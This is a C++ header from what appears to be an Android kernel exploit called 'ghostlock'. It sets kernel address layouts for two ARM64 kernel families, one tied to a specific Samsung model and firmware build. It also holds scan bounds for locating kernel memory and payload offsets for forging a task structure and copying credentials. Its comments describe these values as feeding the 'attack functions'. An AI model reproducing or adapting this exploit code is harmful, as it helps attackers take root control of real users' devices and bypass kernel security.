#ifndef GHOSTLOCK_TARGET_CONSTANTS_HPP
#define GHOSTLOCK_TARGET_CONSTANTS_HPP

#include <cstddef>
#include <cstdint>
#include <limits>
#include <optional>
#include <type_traits>

namespace ghostlock::target {
    namespace address {
        /* Address layout selector.
         *
         * The default is the VA_BITS=48 GKI layout that every existing device
         * profile targets. Defining GHOSTLOCK_TARGET_A53_5_10 at build time
         * selects the VA_BITS=39 android12-5.10 layout instead, which is what
         * SM-A536E / A536EXXSMGZE2 runs.
         *
         * This is a *build-time* switch on purpose: kImageTextBase feeds a
         * constexpr chain (INIT_TASK, INIT_CRED, ...) that is baked into the
         * attack functions, so the layout cannot vary at runtime without
         * turning those into runtime reads across the whole attack surface.
         * One build per kernel family keeps the default path byte-identical.
         *
         * Only kImageTextBase and kPageOffset are correctness-critical here --
         * a wrong value makes address resolution produce garbage and the run
         * dies before touching the kernel. The remaining entries are bounds
         * tunables for the KernelSnitch scan, which only affect how much of
         * the direct map gets searched. */
#if defined(GHOSTLOCK_TARGET_A53_5_10)

        /* _text measured from the shipped boot image header, not assumed. */
        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc008000000ULL;
        /* CONFIG_ARM64_VA_BITS=39 from the device's own /proc/config.gz. */
        inline constexpr std::uintptr_t kPageOffset = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffffc000000000ULL;
        /* Upper bound only. apply_iomem_cache narrows this from a rooted
         * /proc/iomem dump, and its "reject a span >= DIRECT_MAP_END - BASE"
         * guard means this value also has to exceed real DRAM. 64 GiB spans
         * every A53 config and stays inside the 39-bit direct map. */
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffffd000000000ULL;
        /* physmap_info lives in the low physical pages, so 8 GiB of direct map
         * guarantees the identity words fall inside the scan while keeping the
         * sweep far smaller than the default family's 48 GiB. */
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffffc200000000ULL;
        /* Unused by the attack path; retained so the layout stays complete. */
        inline constexpr std::uintptr_t kVmemmapStart = 0xffffffc800000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;

#else

        inline constexpr std::uintptr_t kImageTextBase = 0xffffffc080000000ULL;
        inline constexpr std::uintptr_t kMtkVirtualBase = 0xffffffc000000000ULL;
        inline constexpr std::uintptr_t kPageOffset = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kPhysicalOffset = 0x80000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityStart =
                0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kKernelSnitchIdentityEnd =
                0xffffff8c00000000ULL;
        inline constexpr std::uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
        inline constexpr std::uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;
        inline constexpr std::uintptr_t kVmemmapStart = 0xfffffffe00000000ULL;

#endif
    } // namespace address

    namespace payload {
        inline constexpr std::size_t kLockOffset = 0x0e80;
        inline constexpr std::size_t kWaiterOffset = 0x1180;
        inline constexpr std::size_t kFileOperationsOffset = 0x0f80;
        inline constexpr std::size_t kRightNodeOffset = 0x1240;
        inline constexpr std::size_t kLeftNodeOffset = 0x1260;
        inline constexpr std::size_t kFakeTaskOffset = 0x1280;
        inline constexpr std::size_t kCredentialCopyOffset = 0x1080;
        inline constexpr std::size_t kTcpFakeTaskOffset = 0x5800;
        inline constexpr std::size_t kTcpCredentialCopyOffset = 0x6800;
    } // namespace payload

    template<typename Domain>
    class KernelAddress final {
    public:
        constexpr KernelAddress() noexcept = default;

        explicit constexpr KernelAddress(std::uintptr_t value) noexcept
            : value_(value) {
        }

        [[nodiscard]] constexpr std::uintptr_t value() const noexcept {
            return value_;
        }

        [[nodiscard]] constexpr std::optional<KernelAddress> checked_add(
            std::uintptr_t offset) const noexcept {
            if (offset > std::numeric_limits<std::uintptr_t>::max() - value_) {
                return std::nullopt;
            }
            return KernelAddress(value_ + offset);
        }

        friend constexpr bool operator==(KernelAddress, KernelAddress) = default;

    private:
        std::uintptr_t value_ = 0;
    };

    struct ImageAddressDomain final {
    };

    struct DirectMapAddressDomain final {
    };

    struct PhysicalAddressDomain final {
    };

    static_assert(std::is_standard_layout_v<KernelAddress<ImageAddressDomain> >);
    static_assert(std::is_trivially_copyable_v<KernelAddress<ImageAddressDomain> >);
    static_assert(sizeof(KernelAddress<ImageAddressDomain>) == sizeof(std::uintptr_t));
    static_assert(alignof(KernelAddress<ImageAddressDomain>) == alignof(std::uintptr_t));

    /* The 6.12 pins only describe the default layout. Under a family switch the
     * corresponding assertions come from that branch instead, so a build can
     * never silently carry a mix of the two layouts. */
#if defined(GHOSTLOCK_TARGET_A53_5_10)
    static_assert(address::kImageTextBase == 0xffffffc008000000ULL);
    static_assert(address::kPageOffset == 0xffffffc000000000ULL);
#else
    static_assert(address::kImageTextBase == 0xffffffc080000000ULL);
    static_assert(address::kMtkVirtualBase == 0xffffffc000000000ULL);
#endif

    /* Layout-relative invariants. These must hold in every family. */
    static_assert(address::kPageOffset == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityStart == address::kDirectMapBase);
    static_assert(address::kKernelSnitchIdentityEnd < address::kDirectMapEnd);
    static_assert(payload::kLockOffset == 0x0e80);
    static_assert(payload::kFileOperationsOffset == 0x0f80);
    static_assert(payload::kCredentialCopyOffset == 0x1080);
    static_assert(payload::kWaiterOffset == 0x1180);
    static_assert(payload::kRightNodeOffset == 0x1240);
    static_assert(payload::kLeftNodeOffset == 0x1260);
    static_assert(payload::kFakeTaskOffset == 0x1280);
    static_assert(payload::kTcpFakeTaskOffset == 0x5800);
    static_assert(payload::kTcpCredentialCopyOffset == 0x6800);
} // namespace ghostlock::target

#endif
